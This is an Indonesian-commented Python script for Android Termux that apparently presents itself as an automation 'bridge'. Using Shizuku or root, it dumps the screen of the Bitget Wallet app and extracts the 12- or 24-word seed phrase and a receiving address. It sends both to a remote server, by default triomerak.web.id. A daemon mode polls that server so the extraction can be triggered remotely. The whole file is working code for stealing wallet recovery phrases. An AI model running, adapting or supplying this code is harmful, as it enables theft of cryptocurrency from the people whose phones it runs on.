#!/usr/bin/env python3
"""
bridge.py - TRIO MERAK SHIZUKU BRIDGE FOR TERMUX (ANDROID)
==================================================================
Jembatan otomatisasi Shizuku (rish) di HP Android untuk:
1. Mengekstrak 12/24 kata Seed Phrase dari layar Bitget Wallet.
2. Mendeteksi Alamat Barcode Penerima (0x...) dari layar Bitget Wallet.
3. Mengirimkan hasil ke Web Server Gateway secara aman lewat internet seluler.

Kelebihan:
- TIDAK BUTUH KABEL USB.
- TIDAK BUTUH WIFI.
- KEBAL MODE PESAWAT (Shizuku tetap aktif 100%).
- HANYA MENGGUNAKAN LIBRARY BAWAAN PYTHON (Tanpa butuh pip install).

Cara Penggunaan di Termux:
  python bridge.py --server https://domain-kamu.com (atau http://192.168.x.x:5000)
"""

import os
import sys
import time
import json
import re
import urllib.request
import urllib.error
import subprocess
import xml.etree.ElementTree as ET

CONFIG_FILE = os.path.expanduser("~/.merak_bridge_config.json")

def load_saved_server():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f).get("server_url", "https://triomerak.web.id")
        except Exception:
            pass
    return "https://triomerak.web.id"

def save_server(url):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump({"server_url": url}, f)
    except Exception:
        pass

def get_rish_cmd():
    candidates = [
        ["sh", "/data/data/com.termux/files/usr/bin/rish"],
        ["/data/data/com.termux/files/usr/bin/rish"],
        ["sh", "rish"],
        ["rish"],
        ["su", "-c"]
    ]
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"
    for c in candidates:
        try:
            res = subprocess.run(c + (["id"] if c[0] == "su" else ["-c", "id"]), capture_output=True, text=True, timeout=4, env=env)
            if "uid=" in (res.stdout or ""):
                return c
        except Exception:
            pass
    return None

def exec_shizuku_cmd(cmd_str, timeout=12):
    rish = get_rish_cmd()
    if not rish:
        return ""
    env = os.environ.copy()
    env["RISH_APPLICATION_ID"] = "com.termux"
    try:
        if rish[0] == "su":
            full_cmd = ["su", "-c", cmd_str]
        else:
            full_cmd = rish + ["-c", cmd_str]
        res = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout, env=env)
        return (res.stdout or "").strip()
    except Exception as e:
        return ""

def dump_ui_xml():
    exec_shizuku_cmd("uiautomator dump /sdcard/dump.xml")
    xml_data = exec_shizuku_cmd("cat /sdcard/dump.xml")
    return xml_data

def parse_seed_phrase_from_xml(xml_text):
    if not xml_text or "<hierarchy" not in xml_text:
        return []
    try:
        root = ET.fromstring(xml_text)
    except Exception:
        return []

    raw_nodes = []
    for node in root.iter('node'):
        t = (node.get('text') or '').strip()
        cd = (node.get('content-desc') or '').strip()
        if t:
            raw_nodes.append(t)
        elif cd:
            raw_nodes.append(cd)

    words = []
    for item in raw_nodes:
        lines = [x.strip() for x in item.splitlines() if x.strip()]
        if len(lines) == 2 and lines[0].isdigit() and lines[1].isalpha():
            words.append(lines[1].lower())
        elif len(lines) == 1:
            parts = lines[0].split()
            if len(parts) == 2 and parts[0].replace('.', '').isdigit() and parts[1].isalpha():
                words.append(parts[1].lower())

    if len(words) not in (12, 24):
        ignore = {
            "cadangkan", "tuliskan", "sembunyikan", "teruskan", "batal",
            "lanjut", "kembali", "opsi", "setelan", "tentang", "wallet",
            "phrase", "seed", "backup", "copy", "salin", "lanjutkan",
            "ok", "done", "next", "confirm", "konfirmasi", "view", "show"
        }
        cand = []
        for item in raw_nodes:
            clean = item.strip().lower()
            if clean.isalpha() and 2 <= len(clean) <= 12 and clean not in ignore:
                cand.append(clean)
        if len(cand) in (12, 24):
            words = cand

    return words

def parse_address_from_xml(xml_text):
    if not xml_text:
        return None
    matches = re.findall(r"0x[a-fA-F0-9]{40}", xml_text)
    return matches[0] if matches else None

def send_to_server(server_url, data_type, value, max_retries=8):
    endpoint = server_url.rstrip("/") + "/api/bridge/report"
    payload = json.dumps({
        "type": data_type,
        "value": value,
        "agent": "Termux-Shizuku"
    }).encode("utf-8")

    req = urllib.request.Request(
        endpoint,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "TrioMerakBridge/1.0"}
    )

    print(f"\n[*] Mengirim {data_type} ke server: {endpoint}...")
    for attempt in range(1, max_retries + 1):
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.status == 200:
                    resp_json = json.loads(resp.read().decode("utf-8"))
                    print(f"✅ [SUKSES] Berhasil dikirim ke Server! ({resp_json.get('time', '')})")
                    return True
        except Exception as e:
            print(f"[-] Percobaan {attempt}/{max_retries} tertunda (Menunggu koneksi internet aktif...): {e}")
            time.sleep(2)
    print("❌ [GAGAL] Tidak dapat menghubungi server setelah beberapa percobaan.")
    return False

def action_extract_phrase(server_url):
    print("\n🔍 Mengekstrak layar via Shizuku...")
    xml_data = dump_ui_xml()
    words = parse_seed_phrase_from_xml(xml_data)
    if len(words) in (12, 24):
        phrase = " ".join(words)
        print(f"✅ Ditemukan {len(words)} kata Seed Phrase:")
        print(f"👉 {phrase}")
        send_to_server(server_url, "phrase", phrase)
    else:
        print(f"❌ Ditemukan {len(words)} kata (Bukan 12/24 kata standar). Pastikan halaman seed phrase terbuka!")

def action_extract_address(server_url):
    print("\n🔍 Mendeteksi address penerima dari layar Bitget...")
    xml_data = dump_ui_xml()
    addr = parse_address_from_xml(xml_data)
    if addr:
        print(f"✅ Alamat Barcode Penerima Terdeteksi:")
        print(f"👉 {addr}")
        send_to_server(server_url, "address", addr)
    else:
        print("❌ Alamat 0x... tidak ditemukan di layar. Buka menu Barcode Terima di Bitget!")

def run_daemon(server_url):
    print(f"\n🟢 Mode Auto-Bridge Berjalan! Standby memantau perintah dari: {server_url}")
    print("Tekan CTRL+C untuk berhenti.")
    poll_endpoint = server_url.rstrip("/") + "/api/bridge/poll"
    while True:
        try:
            req = urllib.request.Request(poll_endpoint, headers={"User-Agent": "TrioMerakBridge/1.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                cmd = data.get("command")
                if cmd == "EXTRACT_PHRASE":
                    print("\n[!] Perintah diterima dari Web: AMBIL PHRASE")
                    action_extract_phrase(server_url)
                elif cmd == "DETECT_ADDRESS":
                    print("\n[!] Perintah diterima dari Web: DETEKSI ADDRESS")
                    action_extract_address(server_url)
        except Exception:
            pass
        time.sleep(2)

def main():
    print("=" * 60)
    print("   TRIO MERAK - SHIZUKU BRIDGE FOR ANDROID TERMUX")
    print("=" * 60)

    rish = get_rish_cmd()
    if rish:
        print(f"✅ Akses Shizuku / Root Aktif: {' '.join(rish)}")
    else:
        print("⚠️ PERINGATAN: Shizuku / rish belum terdeteksi aktif di Termux!")
        print("   Pastikan Shizuku running dan jalankan: rish")

    server_url = load_saved_server()
    if "--server" in sys.argv:
        idx = sys.argv.index("--server")
        if idx + 1 < len(sys.argv):
            server_url = sys.argv[idx + 1]
            save_server(server_url)

    if len(sys.argv) > 1 and sys.argv[1] in ("phrase", "1"):
        action_extract_phrase(server_url)
        return
    elif len(sys.argv) > 1 and sys.argv[1] in ("address", "2"):
        action_extract_address(server_url)
        return
    elif len(sys.argv) > 1 and sys.argv[1] in ("daemon", "3"):
        run_daemon(server_url)
        return

    while True:
        print(f"\n🌐 Server Target: {server_url}")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("[1] ⚡ Ambil Seed Phrase (12/24 Kata) & Kirim ke Server")
        print("[2] 📱 Ambil Address Penerima (Barcode Receive) & Kirim")
        print("[3] 🔄 Jalankan Mode Auto-Bridge (Standby menunggu klik Web)")
        print("[4] ⚙️ Ubah Alamat Server Web")
        print("[0] Keluar")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        pilihan = input("Pilih menu [1/2/3/4/0]: ").strip()

        if pilihan == "1":
            action_extract_phrase(server_url)
        elif pilihan == "2":
            action_extract_address(server_url)
        elif pilihan == "3":
            run_daemon(server_url)
        elif pilihan == "4":
            new_url = input("Masukkan URL Server Web (contoh: https://gateway.domain.com): ").strip()
            if new_url:
                if not new_url.startswith("http"):
                    new_url = "http://" + new_url
                server_url = new_url
                save_server(server_url)
                print("✅ Alamat server berhasil disimpan!")
        elif pilihan == "0":
            print("Sampai jumpa!")
            break
        else:
            print("Pilihan tidak valid.")

if __name__ == "__main__":
    main()
